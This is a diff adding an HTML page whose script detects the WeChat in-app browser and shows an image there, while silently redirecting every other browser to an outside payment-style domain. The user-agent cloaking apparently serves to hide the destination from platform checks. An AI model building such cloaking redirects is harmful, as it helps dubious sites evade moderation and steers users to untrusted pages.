@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<style>
+    /* 默认背景样式，适用于非微信浏览器 */
+    body {
+        background-image: url('default.jpg'); /* 可以设置一个默认背景 */
+        background-size: cover;
+    }
+</style>
+<script type="text/javascript">
+    window.onload = function() {
+        // 检测用户代理字符串是否含有'MicroMessenger'，即微信浏览器
+        if (navigator.userAgent.match(/MicroMessenger/i)) {
+    // 如果是微信浏览器，更改背景图片及相关属性
+    document.body.style.backgroundImage = "url('1.jpg')";
+    document.body.style.backgroundSize = "100% 100%"; // 背景图片铺满整个屏幕
+    document.body.style.backgroundRepeat = "no-repeat";
+    document.body.style.backgroundPosition = "left top"; // 背景图片贴在左上角
+    document.body.style.height = "100vh";
+    document.body.style.width = "100vw";
+    document.body.style.margin = "0";
+        } else {
+            // 如果不是微信浏览器，重定向到指定页面
+            window.location.href = "http://s22.htapay.vip/index.php";
+        }
+    };
+</script>
+</head>
+<body>
+    <!-- 页面内容 -->
+</body>
+</html>
